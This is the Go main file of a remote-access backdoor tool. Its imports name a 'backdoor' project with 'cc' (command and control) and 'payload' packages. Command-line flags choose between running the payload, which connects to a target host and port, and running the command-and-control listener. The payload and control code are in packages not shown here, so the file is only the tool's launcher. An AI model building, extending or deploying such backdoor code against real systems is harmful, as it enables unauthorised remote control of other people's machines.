package main

import (
	"flag"

	"gitlab.com/rawbots/backdoor/cc"
	"gitlab.com/rawbots/backdoor/payload"
)

func main() {
	listenPtr := flag.Bool("listen", false, "listen on [host]:[port] for incoming connections")
	portPtr := flag.Int("port", 9999, "port to listen on")
	targetPtr := flag.String("target", "127.0.0.1", "target host")

	flag.Parse()

	// Check if this is a client or a server
	if !*listenPtr && *targetPtr != "" {
		p := &payload.Payload{
			Port:   *portPtr,
			Target: *targetPtr,
		}
		p.Run()
	}

	// Okay it is a server
	if *listenPtr {
		c := &cc.CommandControl{
			Port:   *portPtr,
			Target: *targetPtr,
		}
		c.Run()
	}
}
